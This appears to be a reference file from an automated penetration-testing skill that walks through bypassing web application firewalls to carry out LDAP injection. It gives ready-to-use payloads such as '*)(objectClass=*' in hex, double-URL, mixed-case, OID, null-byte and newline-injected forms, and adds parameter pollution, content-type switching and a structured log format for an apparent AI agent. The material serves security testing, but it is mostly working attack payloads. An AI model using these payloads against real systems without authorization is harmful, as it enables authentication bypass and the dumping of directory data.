# LDAP Filter & WAF Bypass

## When to Use

- HTTP 403/406 on injection attempts containing `*`, `(`, `)`, `\`
- Metacharacters appear stripped or escaped in response
- Wildcard `*` returns same result count as exact match
- Responses identical despite clear metacharacter injection
- Selective blocking — some characters pass, others don't

## Bypass Workflow

```
1. Identify what's blocked (character? pattern? keyword?)
2. Apply targeted bypass from priority order below
3. Re-baseline with working payload structure
4. Return to SKILL.md and continue exploitation
```

---

## Step 1: Identify What's Being Filtered

Test each LDAP metacharacter individually — send in isolation and compare against baseline:

```
param=*          → wildcard — blocked?
param=(          → open paren — blocked?
param=)          → close paren — blocked?
param=\          → backslash — blocked?
param=&          → ampersand — blocked?
param=|          → pipe — blocked?
param=!          → exclamation — blocked?
param=\00        → null byte — blocked?
param=)(uid=x    → combined — blocked?
```

For each: compare response to baseline. **Blocked** = 400/403/406 or identical to invalid baseline. **Passed** = any behavioral difference.

Narrow down exactly which characters/patterns trigger blocking before applying bypass.

---

## Step 2: LDAP Hex Escape Bypass (Priority 1)

LDAP natively supports `\HH` hex escape sequences in filter values. Many WAFs block raw metacharacters but don't decode LDAP hex escapes.

**LDAP Hex Escape Table:**

| Character | LDAP Hex Escape | URL Encoded |
|-----------|----------------|-------------|
| `*` | `\2a` | `%2a` |
| `(` | `\28` | `%28` |
| `)` | `\29` | `%29` |
| `\` | `\5c` | `%5c` |
| NUL | `\00` | `%00` |
| `&` | `\26` | `%26` |
| `\|` | `\7c` | `%7c` |
| `!` | `\21` | `%21` |
| `=` | `\3d` | `%3d` |
| space | `\20` | `%20` |

**Testing approach:**

For each blocked character, substitute hex escape and retest:
```
param=*          → blocked
param=\2a        → try — does WAF pass it? Does LDAP interpret as *?

param=)(uid=x    → blocked
param=\29\28uid=x → try — parentheses hex escaped
```

**Q:** How do I know if LDAP is interpreting the hex escape?
**A:** If the response changes from invalid baseline toward valid baseline behavior, the LDAP library decoded the hex escape even though the WAF let it through.

**Q:** What if the LDAP library doesn't interpret hex in this position?
**A:** Hex escaping is only valid in filter values, not in attribute names or filter structure. If you're injecting into the value position, hex should work. If not — the injection point itself may not reach an LDAP filter.

---

## Step 3: URL Encoding Bypass (Priority 2)

If the WAF decodes URL encoding before inspection, double URL encoding can bypass it:

| Character | URL Encoded | Double URL Encoded |
|-----------|------------|-------------------|
| `*` | `%2a` | `%252a` |
| `(` | `%28` | `%2528` |
| `)` | `%29` | `%2529` |
| `\` | `%5c` | `%255c` |
| `&` | `%26` | `%2526` |
| `\|` | `%7c` | `%257c` |
| `!` | `%21` | `%2521` |

**Testing approach:**

```
Blocked: param=*
Try 1:   param=%2a       → single URL encode
Try 2:   param=%252a     → double URL encode (if WAF decodes once before check)
```

**Q:** When does double encoding work?
**A:** When the WAF decodes once (sees `%2a` → `*` → blocks it) but then the server decodes again. Double encoded `%252a` → WAF sees `%2a` (not `*`) → passes → server decodes `%2a` → LDAP receives `*`.

---

## Step 4: Mixed Encoding Bypass (Priority 3)

Combine raw characters with hex-escaped ones to break pattern matching:

```
Raw injection:     param=*)(uid=*          → blocked (pattern: *)(...)
Mixed encoding:    param=\2a)(uid=\2a      → escape only wildcards
Mixed encoding:    param=*\29\28uid=*      → escape only parens
Mixed encoding:    param=\2a\29\28uid=\2a  → escape all metacharacters
```

**Q:** Why mix instead of escaping everything?
**A:** WAF patterns often match the raw sequence. Breaking one character in the matched pattern can bypass the rule entirely, even if other characters are raw.

---

## Step 5: Case Variation — Attribute Names (Priority 4)

LDAP attribute names are case-insensitive. WAF rules may be case-sensitive:

```
objectClass  → OBJECTCLASS, objectclass, ObjectClass, oBjEcTcLaSs
userPassword → userpassword, USERPASSWORD, UserPassword
memberOf     → memberof, MEMBEROF, MemberOf
uid          → UID, uId, Uid
cn           → CN, Cn
sAMAccountName → samaccountname, SAMACCOUNTNAME
```

**Example:**
```
Blocked: param=*)(objectClass=*
Try:     param=*)(OBJECTCLASS=*
Try:     param=*)(ObjectClass=*
```

---

## Step 6: Protocol-Level Bypass Techniques

### HTTP Parameter Pollution

If the backend takes first or last value of repeated parameters:

```
?username=admin&username=*)(objectClass=*
?username=*)(objectClass=*&username=admin
```

WAF may validate only one occurrence; backend LDAP query may use the other.

### Content-Type Switching

WAF may only inspect `application/x-www-form-urlencoded`. Try switching:

```
Content-Type: application/json
{"username": "*)(objectClass=*", "password": "test"}

Content-Type: text/xml
<login><user>*)(objectClass=*</user></login>
```

### Chunked Transfer Encoding

Some WAFs fail to reconstruct chunked request bodies for inspection:

```
Transfer-Encoding: chunked

[Body sent in multiple chunks containing the metacharacters]
```

### Path-Based Parameter

If the injectable value appears in a URL path rather than query string:

```
Normal:  /user/alice
Try:     /user/*
Try:     /user/alice)(objectClass=*
```

---

## Step 7: OID-Based Attribute Bypass (AD-Specific)

Active Directory supports Object Identifier (OID) notation for attribute names. WAFs blocking keyword `objectClass` or `sAMAccountName` won't block the OID equivalent:

| Attribute | OID Equivalent |
|-----------|---------------|
| `objectClass` | `2.5.4.0` |
| `cn` | `2.5.4.3` |
| `sn` | `2.5.4.4` |
| `mail` | `0.9.2342.19200300.100.1.3` |
| `uid` | `0.9.2342.19200300.100.1.1` |
| `sAMAccountName` | `1.2.840.113556.1.4.221` |
| `memberOf` | `1.2.840.113556.1.4.222` |
| `userPassword` | `2.5.4.35` |

**Example:**
```
Blocked: param=*)(objectClass=*
Try:     param=*)(2.5.4.0=*

Blocked: param=*)(sAMAccountName=admin
Try:     param=*)(1.2.840.113556.1.4.221=admin
```

---

## Step 8: Pattern-Breaking Techniques

### Null Byte Insertion

Insert null bytes to break WAF pattern recognition while preserving LDAP behavior:

```
param=%00*)(objectClass=*     → null before injection
param=*)%00(objectClass=*     → null between paren and open paren
param=*)(objectClass%00=*     → null between attr and equals
```

**Q:** Why does this sometimes work?
**A:** Some WAFs are built on C-string processing and treat null byte as string terminator. The check sees `param=` (empty). The LDAP library may ignore or strip the null and process the rest.

### Newline Injection

```
param=%0a*)(objectClass=*
param=*%0d%0a)(objectClass=*
```

Some WAF regex patterns anchor to start of line. Newline prefix shifts the injection past the anchor.

### Whitespace Injection

LDAP is generally whitespace-sensitive in values, but some WAF patterns require no space before keywords:

```
param=* )(objectClass=*        → space before )
param=*)( objectClass=*        → space after (
param=*)(objectClass =*        → space before =
```

---

## Bypass Verification

After finding a working bypass:

1. **Re-baseline** with the bypass payload structure in place
2. **Verify injection still works** — run TRUE/FALSE tests with bypass encoding
3. **Apply bypass encoding consistently** to all subsequent payloads in exploitation
4. **Return to SKILL.md Phase 2** and re-confirm classification with bypass in place

---

## Attempt Limits

| Scope | Max Attempts |
|-------|-------------|
| Per blocked character, per encoding type | 2 attempts |
| OID substitution | 1 attempt per attribute |
| Protocol-level techniques | 1 attempt each |
| Pattern-breaking per technique | 1 attempt each |
| **Total bypass attempts** | **Max 15 before concluding filtered** |

**If no bypass found after 15 attempts:**

> Bypass attempts exhausted. WAF is blocking LDAP metacharacters and no bypass technique produced a different response. Document WAF protection presence and move to next parameter or escalate for manual review.

---

## Common Failure Patterns

| Symptom | Cause | Fix |
|---------|-------|-----|
| All raw metacharacters blocked, hex works | WAF does pattern match on raw chars only | Use LDAP hex escapes throughout |
| Hex escapes also blocked | WAF decodes hex before checking | Try double URL encoding |
| Partial payload works, full doesn't | WAF matches combined sequence, not individual chars | Mix encoding, change order of injection |
| Bypass works once then blocks | Adaptive/learning WAF | Vary encoding per request |
| 400/500 but not 403 | App-level sanitization, not WAF | Injection reaches app but is sanitized — try different injection format |
| Everything blocked | Defense-in-depth | Document as WAF-protected, escalate |

---

## Reasoning Format

```
[BYPASS]
[BLOCKED]    {exact character or pattern that triggers block}
[TECHNIQUE]  {LDAP hex / URL encode / Double URL / Case variation / OID / Protocol / Pattern-break}
[ATTEMPT]    {specific encoding or method tried}
[PAYLOAD]    {full payload with bypass applied}
[RESULT]     {passes WAF / still blocked / different error}
[ATTEMPTS]   {X}/15
[NEXT]       {try next technique / re-baseline with bypass / conclude filtered}
```

---

## Quick Reference: Common Scenarios

**Q:** Wildcard `*` blocked by WAF, need to dump directory?
**A:** Try `\2a` (LDAP hex). If blocked, try `%2a` (URL encode). If blocked, try `%252a` (double URL encode).

**Q:** Parentheses `(` `)` blocked but `*` works?
**A:** Try `\28` and `\29` for LDAP hex. Or try HTTP Parameter Pollution to deliver full payload in second parameter.

**Q:** `objectClass` keyword is WAF-blocked?
**A:** Try case variation: `OBJECTCLASS`, `ObjectClass`. Or try OID equivalent `2.5.4.0` if AD environment.

**Q:** Every technique blocked, but you see behavioral difference on wildcard alone?
**A:** `*` bypassed but operator injection blocked. Limit testing to wildcard-only extraction (prefix enumeration via `a*`, `b*`, etc.) without operator chaining.

**Q:** Nothing works at all, not even `*`?
**A:** WAF is blocking all LDAP-relevant chars. Document WAF protection. Escalate for manual review or try a completely different parameter on the same target.
